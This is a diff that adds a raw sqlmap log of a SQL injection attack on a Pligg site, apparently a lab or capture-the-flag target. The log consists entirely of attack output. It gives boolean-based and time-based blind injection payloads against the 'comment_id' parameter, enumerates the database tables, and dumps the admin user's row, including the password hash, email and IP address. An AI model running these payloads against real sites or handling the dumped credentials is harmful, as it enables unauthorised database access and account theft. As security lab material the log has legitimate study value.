@@ -1,0 +1,191 @@
+sqlmap identified the following injection point(s) with a total of 385 HTTP(s) requests:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+current database: 'base_de_pepe'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[59 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+Database: base_de_pepe
+[24 tables]
++---------------------------------------+
+| pligg_additional_categories           |
+| pligg_categories                      |
+| pligg_comments                        |
+| pligg_config                          |
+| pligg_formulas                        |
+| pligg_friends                         |
+| pligg_group_member                    |
+| pligg_group_shared                    |
+| pligg_groups                          |
+| pligg_links                           |
+| pligg_login_attempts                  |
+| pligg_messages                        |
+| pligg_misc_data                       |
+| pligg_modules                         |
+| pligg_old_urls                        |
+| pligg_redirects                       |
+| pligg_saved_links                     |
+| pligg_tag_cache                       |
+| pligg_tags                            |
+| pligg_totals                          |
+| pligg_trackbacks                      |
+| pligg_users                           |
+| pligg_votes                           |
+| pligg_widgets                         |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+Database: base_de_pepe
+Table: pligg_users
+[1 entry]
++---------+---------+------------------+---------------------+---------------------------------------------------+-------------------+------------+------------+------------+------------+------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------------+----------------+-----------------+-----------------+-----------------+-----------------+---------------------+---------------------+--------------------+
+| user_id | user_ip | user_url         | user_date           | user_pass                                         | user_email        | user_karma | user_level | user_login | user_names | user_skype | user_lastip  | public_email | user_enabled | user_twitter | user_facebook | user_language | user_linkedin | user_location | user_lastlogin      | user_pinterest | last_reset_code | user_categories | user_googleplus | user_occupation | user_modification   | last_reset_request  | user_avatar_source |
++---------+---------+------------------+---------------------+---------------------------------------------------+-------------------+------------+------------+------------+------------+------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------------+----------------+-----------------+-----------------+-----------------+-----------------+---------------------+---------------------+--------------------+
+| 1       | 0       | http://pligg.com | 2015-11-18 18:11:34 | 1bf490bb34c2383ac91e67505741b9cdad3b9bee87e62ba98 | bobama@nsa.gov.us | 36.00      | admin      | barack     | <blank>    | <blank>    | 172.18.1.100 | <blank>      | 1            | <blank>      | <blank>       | NULL          | <blank>       | NULL          | 2015-11-18 22:06:24 | <blank>        | NULL            | <blank>         | <blank>         | NULL            | 2015-11-18 22:06:24 | 2015-11-18 18:11:34 | <blank>            |
++---------+---------+------------------+---------------------+---------------------------------------------------+-------------------+------------+------------+------------+------------+------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------------+----------------+-----------------+-----------------+-----------------+-----------------+---------------------+---------------------+--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: comment_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=secret-war&reply=1&comment_id=1 AND 3478=3478
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=secret-war&reply=1&comment_id=1 AND (SELECT 4642 FROM (SELECT(SLEEP(5)))PdBI)
+---
+back-end DBMS: MySQL >= 5.0.12
+database management system users privileges:
+[*] %pepe% [1]:
+    privilege: USAGE
+
